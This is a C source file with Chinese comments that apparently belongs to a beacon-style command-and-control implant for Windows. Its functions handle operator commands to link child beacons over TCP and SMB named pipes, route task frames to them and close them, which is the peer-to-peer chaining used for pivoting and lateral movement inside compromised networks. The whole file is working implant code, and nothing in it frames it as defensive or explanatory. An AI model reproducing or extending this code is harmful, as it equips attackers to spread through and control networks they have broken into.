#include "beacon_cascade_internal.h"

/* ===== 命令处理函数 ===== */

/* 处理 TCP 连接命令：解析参数后主动连接子通道 */
ByteBuf CascadeHandleConnectTcp(BeaconContext* ctx, Parser* parser)
{
    UINT32 argc;
    CHAR* child_id = NULL;
    CHAR* host = NULL;
    UINT32 port;
    CascadeIo io;
    CHAR hint[256];
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade tcp request");
    argc = ParserU32(parser);
    if (argc < 3) return BbFromText("connect requires child_id, host and port");

    child_id = ParserString(parser);
    host = ParserString(parser);
    port = ParserU32(parser);
    if (parser->error[0]) {
        result = BbFromText(parser->error);
        goto cleanup;
    }

    if (!CascadeIoConnectTcp(host, (INT)port, ctx->profile.tcp_internal.connect_timeout_ms, &io)) {
        result = BbFromText("tcp child connect failed");
        goto cleanup;
    }

    snprintf(hint, sizeof(hint), "%s:%lu", host, (ULONG)port);
    result = CascadeRegisterChannel(ctx, child_id, CASCADE_PROTOCOL_TCP, hint, &io);

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    HeapFree(GetProcessHeap(), 0, host);
    return result;
}

/* 处理 SMB 链接命令：解析参数后通过命名管道连接子通道 */
ByteBuf CascadeHandleLinkSmb(BeaconContext* ctx, Parser* parser)
{
    UINT32 argc;
    CHAR* child_id = NULL;
    CHAR* pipe = NULL;
    CascadeIo io;
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade smb request");
    argc = ParserU32(parser);
    if (argc < 2) return BbFromText("link requires child_id and pipe path");

    child_id = ParserString(parser);
    pipe = ParserString(parser);
    if (parser->error[0]) {
        result = BbFromText(parser->error);
        goto cleanup;
    }

    if (!CascadeIoConnectPipe(pipe, ctx->profile.smb_internal.connect_timeout_ms, &io)) {
        result = BbFromText("smb child link failed");
        goto cleanup;
    }

    result = CascadeRegisterChannel(ctx, child_id, CASCADE_PROTOCOL_SMB, pipe, &io);

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    HeapFree(GetProcessHeap(), 0, pipe);
    return result;
}

/* 处理路由命令：将数据帧转发给指定子通道 */
ByteBuf CascadeHandleRoute(BeaconContext* ctx, Parser* parser)
{
    CHAR* child_id = NULL;
    ByteBuf blob;
    CascadeChannel* ch;
    BOOL ok;
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade route request");

    child_id = ParserString(parser);
    blob = ParserBytes(parser);
    if (parser->error[0]) {
        BbFree(&blob);
        result = BbFromText(parser->error);
        goto cleanup;
    }

    EnterCriticalSection(&ctx->cascade.lock);
    ch = CascadeFindLocked(&ctx->cascade, child_id);
    LeaveCriticalSection(&ctx->cascade.lock);

    if (!ch) {
        BbFree(&blob);
        result = BbFromText("cascade child not found");
        goto cleanup;
    }

    ok = CascadeIoWriteFrame(&ch->io, CASCADE_FRAME_TASK, &blob);
    BbFree(&blob);
    if (!ok) {
        InterlockedExchange((LONG*)&ch->active, 0);
        CascadeQueueDead(&ctx->cascade, child_id, "route write failed");
        result = BbFromText("cascade route write failed");
        goto cleanup;
    }

    result = BbFromText("cascade route sent");

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    return result;
}

/* 处理关闭命令：发送 CLOSE 帧并断开指定子通道 */
ByteBuf CascadeHandleClose(BeaconContext* ctx, Parser* parser)
{
    CHAR* child_id = NULL;
    CascadeChannel* ch;
    ByteBuf empty;
    ByteBuf result;

    BbInit(&result);

    if (!ctx || !parser) return BbFromText("invalid cascade close request");
    child_id = ParserString(parser);
    if (parser->error[0]) {
        result = BbFromText(parser->error);
        goto cleanup;
    }

    EnterCriticalSection(&ctx->cascade.lock);
    ch = CascadeFindLocked(&ctx->cascade, child_id);
    LeaveCriticalSection(&ctx->cascade.lock);

    if (!ch) {
        result = BbFromText("cascade child not found");
        goto cleanup;
    }

    BbInit(&empty);
    CascadeIoWriteFrame(&ch->io, CASCADE_FRAME_CLOSE, &empty);
    InterlockedExchange((LONG*)&ch->active, 0);
    CascadeIoClose(&ch->io);
    result = BbFromText("cascade child closed");

cleanup:
    HeapFree(GetProcessHeap(), 0, child_id);
    return result;
}
